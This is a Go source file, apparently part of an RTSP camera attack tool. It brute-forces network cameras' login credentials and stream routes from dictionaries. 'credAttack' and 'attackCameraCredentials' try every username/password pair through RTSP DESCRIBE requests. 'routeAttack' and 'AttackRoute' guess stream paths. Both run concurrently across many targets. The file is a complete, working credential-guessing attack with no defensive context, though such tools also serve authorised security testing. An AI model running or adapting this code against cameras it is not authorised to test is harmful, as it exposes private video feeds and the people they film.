// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package cmrdr

import (
	"fmt"
	"time"

	curl "github.com/andelf/go-curl"
	"github.com/pkg/errors"
	v "gopkg.in/go-playground/validator.v9"
)

// HACK: See https://stackoverflow.com/questions/3572397/lib-curl-in-c-disable-printing
func doNotWrite([]uint8, interface{}) bool {
	return true
}

func routeAttack(camera Stream, route string, timeout time.Duration, enableLogs bool) bool {
	easy := curl.EasyInit()
	defer easy.Cleanup()

	if easy != nil {
		attackURL := fmt.Sprintf(
			"rtsp://%s:%s@%s:%d/%s",
			camera.Username,
			camera.Password,
			camera.Address,
			camera.Port,
			route,
		)

		if enableLogs {
			// Debug logs when logs are enabled
			easy.Setopt(curl.OPT_VERBOSE, 1)
		} else {
			// Do not write sdp in stdout
			easy.Setopt(curl.OPT_WRITEFUNCTION, doNotWrite)
		}

		// Do not send a body in the describe request
		easy.Setopt(curl.OPT_NOBODY, 1)
		// Send a request to the URL of the camera we want to attack
		easy.Setopt(curl.OPT_URL, attackURL)
		// Set the RTSP STREAM URI as the camera URL
		easy.Setopt(curl.OPT_RTSP_STREAM_URI, attackURL)
		// 2 is CURL_RTSPREQ_DESCRIBE
		easy.Setopt(curl.OPT_RTSP_REQUEST, 2)
		// Set custom timeout
		easy.Setopt(curl.OPT_TIMEOUT_MS, int(timeout/time.Millisecond))

		// Perform the request
		easy.Perform()

		// Get return code for the request
		rc, err := easy.Getinfo(curl.INFO_RESPONSE_CODE)
		if err != nil {
			return false
		}

		// If it's a 404, it means that the route was not valid
		if rc == 404 {
			return false
		}

		return true
	}
	return false
}

func credAttack(camera Stream, username string, password string, timeout time.Duration, enableLogs bool) bool {
	easy := curl.EasyInit()
	defer easy.Cleanup()

	if easy != nil {
		attackURL := fmt.Sprintf(
			"rtsp://%s:%s@%s:%d/%s",
			username,
			password,
			camera.Address,
			camera.Port,
			camera.Route,
		)

		if enableLogs {
			// Debug logs when logs are enabled
			easy.Setopt(curl.OPT_VERBOSE, 1)
		} else {
			// Do not write sdp in stdout
			easy.Setopt(curl.OPT_WRITEFUNCTION, doNotWrite)
		}

		// Do not send a body in the describe request
		easy.Setopt(curl.OPT_NOBODY, 1)
		// Send a request to the URL of the camera we want to attack
		easy.Setopt(curl.OPT_URL, attackURL)
		// Set the RTSP STREAM URI as the camera URL
		easy.Setopt(curl.OPT_RTSP_STREAM_URI, attackURL)
		// 2 is CURL_RTSPREQ_DESCRIBE
		easy.Setopt(curl.OPT_RTSP_REQUEST, 2)
		// Set custom timeout
		easy.Setopt(curl.OPT_TIMEOUT_MS, int(timeout/time.Millisecond))

		// Perform the request
		easy.Perform()

		// Get return code for the request
		rc, err := easy.Getinfo(curl.INFO_RESPONSE_CODE)
		if err != nil {
			return false
		}

		// If it's a 403 or a 401, it means that the credentials are not correct
		if rc == 403 || rc == 401 {
			return false
		}

		return true
	}
	return false
}

func attackCameraCredentials(target Stream, credentials Credentials, resultsChan chan<- Stream, timeout time.Duration, log bool) {
	for _, username := range credentials.Usernames {
		for _, password := range credentials.Passwords {
			ok := credAttack(target, username, password, timeout, log)
			if ok {
				target.CredentialsFound = true
				target.Username = username
				target.Password = password
				resultsChan <- target
				return
			}
		}
	}
	target.CredentialsFound = false
	resultsChan <- target
}

func attackCameraRoute(target Stream, routes Routes, resultsChan chan<- Stream, timeout time.Duration, log bool) {
	for _, route := range routes {
		ok := routeAttack(target, route, timeout, log)
		if ok {
			target.RouteFound = true
			target.Route = route
			resultsChan <- target
			return
		}
	}
	target.RouteFound = false
	resultsChan <- target
}

// AttackCredentials attempts to guess the provided targets' credentials using the given
// dictionary or the default dictionary if none was provided by the user.
func AttackCredentials(targets []Stream, credentials Credentials, timeout time.Duration, log bool) (results []Stream, err error) {
	attacks := make(chan Stream)
	defer close(attacks)

	validate := v.New()
	for _, target := range targets {
		err := validate.Struct(target)
		if err != nil {
			return targets, errors.Wrap(err, "invalid streams")
		}

		go attackCameraCredentials(target, credentials, attacks, timeout, log)
	}

	attackResults := []Stream{}
	for _ = range targets {
		attackResults = append(attackResults, <-attacks)
	}

	found := 0
	for _, result := range attackResults {
		if result.CredentialsFound == true {
			targets = replace(targets, result)
			found++
		}
	}
	if found == 0 {
		return targets, errors.New("No credentials found")
	}

	return targets, nil
}

// AttackRoute attempts to guess the provided targets' streaming routes using the given
// dictionary or the default dictionary if none was provided by the user.
func AttackRoute(targets []Stream, routes Routes, timeout time.Duration, log bool) (results []Stream, err error) {
	attacks := make(chan Stream)
	defer close(attacks)

	validate := v.New()
	for _, target := range targets {
		err := validate.Struct(target)
		if err != nil {
			return targets, errors.Wrap(err, "invalid streams")
		}

		go attackCameraRoute(target, routes, attacks, timeout, log)
	}

	attackResults := []Stream{}
	for _ = range targets {
		attackResults = append(attackResults, <-attacks)
	}

	found := 0
	for _, result := range attackResults {
		if result.RouteFound == true {
			targets = replace(targets, result)
			found++
		}
	}
	if found == 0 {
		return targets, errors.New("No routes found")
	}

	return targets, nil
}
